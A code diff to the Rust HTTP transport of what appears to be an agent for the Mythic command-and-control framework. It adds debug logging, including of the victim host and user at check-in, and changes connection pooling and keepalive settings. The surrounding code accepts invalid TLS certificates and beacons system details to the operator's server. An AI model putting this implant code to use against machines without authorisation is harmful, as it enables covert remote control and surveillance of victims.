@@ -127,10 +127,13 @@ impl HttpProfile {
     }
 
     fn build_client(&self) -> reqwest::Client {
+        utils::print_debug("HTTP: Building new HTTP client");
         let mut builder = reqwest::Client::builder()
             .danger_accept_invalid_certs(true)
             .no_proxy()
-            .timeout(Duration::from_secs(30));
+            .timeout(Duration::from_secs(30))
+            .pool_max_idle_per_host(0) // Disable connection pooling to avoid reuse issues in dylib
+            .tcp_keepalive(Some(Duration::from_secs(5)));
 
         let proxy_host = self.proxy_host.read().unwrap();
         if !proxy_host.is_empty() {
@@ -345,8 +348,12 @@ impl HttpProfile {
     /// Perform initial checkin with Mythic
     async fn checkin(&self) -> Option<CheckInMessageResponse> {
         let checkin_msg = profiles::create_checkin_message();
+        utils::print_debug(&format!("HTTP: Checkin message - UUID: {}, Host: {}, User: {}",
+            checkin_msg.uuid, checkin_msg.host, checkin_msg.user));
         let checkin_json = serde_json::to_vec(&checkin_msg).ok()?;
+        utils::print_debug(&format!("HTTP: Checkin JSON size: {} bytes", checkin_json.len()));
         let response_bytes = self.send_message(&checkin_json).await?;
+        utils::print_debug("HTTP: Checkin response received, parsing");
         serde_json::from_slice(&response_bytes).ok()
     }
 
